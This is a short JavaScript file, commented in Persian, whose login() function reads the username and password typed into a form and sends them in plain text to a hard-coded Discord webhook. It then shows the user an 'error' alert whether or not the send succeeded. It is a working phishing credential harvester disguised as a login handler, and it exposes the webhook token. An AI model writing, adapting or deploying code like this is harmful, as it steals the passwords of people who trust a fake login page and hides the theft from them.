// تابع برای ارسال اطلاعات ورود به وب‌هوک دیسکورد
function login() {
  // گرفتن مقادیر ورود از فیلدهای فرم
  const username = document.getElementById('usernameInput').value;
  const password = document.getElementById('passwordInput').value;

  // آدرس وب‌هوک دیسکورد
  const discordWebhookUrl = 'https://discord.com/api/webhooks/1229434978249736313/Ay4t3KJ-YnWytlWQ1e7CDxyVRmstLzRnFmMdo3yijoLJxEBWoM9MZ-kp6F3kA8GoOqJl';

  // ساخت پیام به صورت متن ساده
  const message = `New login attempt:
    Username: ${username}
    Password: ${password}`;

  // ارسال درخواست POST به وب‌هوک دیسکورد با پیام به صورت متن ساده
  fetch(discordWebhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: message })
  })
  .then(response => {
    if (response.ok) {
      console.log('خطا');
      alert('خطا.');
    } else {
      console.error('خطا');
      alert('خطا');
    }
  })
  .catch(error => {
    console.error('خطا', error);
    alert('خطا');
  });
}
